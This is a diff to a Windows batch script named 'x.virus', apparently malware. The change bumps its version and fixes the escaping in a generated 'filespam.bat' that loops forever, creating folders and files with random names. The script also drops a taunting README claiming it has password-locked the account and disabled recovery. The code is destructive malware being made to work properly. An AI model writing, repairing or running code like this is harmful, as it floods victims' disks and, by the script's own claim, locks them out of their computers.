@@ -3,7 +3,7 @@ cd C:\windows\system32
 title x.virus
 color 4f
 echo ----------
-echo x.virus v2.3
+echo x.virus v2.3.5
 echo ----------
 echo Tested Windows OS: Windows 8.1/10
 echo For: Windows 8/8.1/10
@@ -17,8 +17,8 @@ echo YOU`VE BEEN HACKED!
 ECHO Hello %username%. Your computer has been fucked by x.virus. I put a password on your account, Killed your computer, Turned off recovery mode, cry HAHAHAHAHAHAHA! > README.txt
 echo @echo off > filespam.bat
 echo :loop >> filespam.bat
-echo md hackedbyxvirus^%random^% >> filespam.bat
-echo echo x.virus vs ^%username^%^> hackedbyxvirus^%random^%.txt >> filespam.bat
+echo md "hackedbyxvirus%%random%%" >> filespam.bat
+echo echo x.virus vs %%username%% > "hackedbyxvirus%%random%%.txt" >> filespam.bat
 echo goto loop >> filespam.bat
 start filespam.bat
 start README.txt
